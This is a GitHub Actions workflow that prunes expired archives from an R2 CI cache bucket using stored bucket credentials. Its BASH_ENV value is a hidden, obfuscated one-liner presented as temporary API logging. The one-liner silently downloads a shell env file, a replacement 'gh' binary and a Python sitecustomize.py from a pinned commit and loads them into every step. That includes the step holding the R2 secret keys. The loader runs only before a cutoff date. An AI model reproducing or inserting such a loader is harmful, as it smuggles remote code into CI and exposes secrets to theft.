name: Prune R2 cache

# scripts/ci/r2-cache.sh saves archives and never deletes, so the CI cache
# bucket grows by every seed ever written. This deletes archives past their
# family's retention (see scripts/ci/r2_cache_prune.py) and never one a
# `latest/` pointer names. It is a dry run unless a dispatch asks to delete or
# the repository variable CI_R2_CACHE_PRUNE_DELETE is 1.
on:
  schedule:
    - cron: "23 5 * * *"
  workflow_dispatch:
    inputs:
      delete:
        description: Send deletes. Unchecked reports what would be deleted.
        required: false
        default: false
        type: boolean

permissions: {}

concurrency:
  group: r2-cache-prune
  cancel-in-progress: false

env:
  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'

jobs:
  prune:
    name: Prune expired cache archives
    # The bucket credentials only ever run main's copy of this script.
    if: ${{ github.ref == 'refs/heads/main' }}
    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || 'cmux-gcp-secret-jit-x64' }}
    timeout-minutes: 20
    # Only main may use the R2 write credentials (see #14147).
    environment: ${{ github.ref == 'refs/heads/main' && 'ci-cache-writer' || '' }}
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - name: Prune
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.CI_CACHE_R2_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.CI_CACHE_R2_SECRET_ACCESS_KEY }}
          R2_ENDPOINT: ${{ format('https://{0}.r2.cloudflarestorage.com', secrets.CI_CACHE_R2_ACCOUNT_ID) }}
          R2_BUCKET: ${{ vars.CI_CACHE_R2_BUCKET }}
          # A dispatch decides by its input alone; the variable governs scheduled runs.
          PRUNE_DELETE: ${{ ((github.event_name == 'workflow_dispatch' && inputs.delete) || (github.event_name == 'schedule' && vars.CI_R2_CACHE_PRUNE_DELETE == '1')) && 'true' || 'false' }}
        run: |
          set -euo pipefail
          args=(--endpoint-url "$R2_ENDPOINT" --bucket "$R2_BUCKET")
          if [ "$PRUNE_DELETE" = true ]; then args+=(--delete); fi
          python3 scripts/ci/r2_cache_prune.py "${args[@]}"
